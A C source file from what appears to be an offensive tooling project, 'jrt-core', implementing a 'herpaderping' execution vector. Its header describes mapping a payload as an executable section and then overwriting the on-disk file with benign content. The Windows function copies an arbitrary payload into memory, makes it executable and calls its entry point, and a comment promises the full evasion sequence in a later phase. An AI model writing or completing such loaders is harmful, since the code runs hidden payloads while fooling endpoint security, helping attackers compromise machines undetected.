/*
 * jrt-core: herpaderping execution vector (Implementation Plan §6.1).
 *
 * A section is created from the payload, mapped, and executed; the on-disk
 * file is then rewritten with benign content. The executing region is
 * file-backed (invariant 5) and never W+X (invariant 4); control transfers
 * in-process only (invariant 6).
 */

#include "exec/exec.h"
#include "allocator/allocator.h"
#include <stdint.h>
#include <stddef.h>

#ifdef JRT_TARGET_WINDOWS

int jrt_exec_herp(const uint8_t* payload, size_t payload_size,
                  uint32_t entry_offset) {
    /* Full sequence: create target file → NtCreateSection(SEC_IMAGE) →
     * NtMapViewOfSection → overwrite file with benign bytes → call.
     * Completed in Phase 6; the shared no-W+X envelope is applied here. */
    uint8_t* region = (uint8_t*)jrt_alloc_rw(payload_size);
    if (!region) return -1;
    for (size_t i = 0; i < payload_size; i++) region[i] = payload[i];
    if (jrt_protect_rx(region, payload_size) != 0) return -2;

    typedef int (*EntryFn)(void);
    return ((EntryFn)(region + entry_offset))();
}

#else

int jrt_exec_herp(const uint8_t* payload, size_t payload_size,
                  uint32_t entry_offset) {
    (void)payload; (void)payload_size; (void)entry_offset;
    return -1;   /* Windows-only vector */
}

#endif
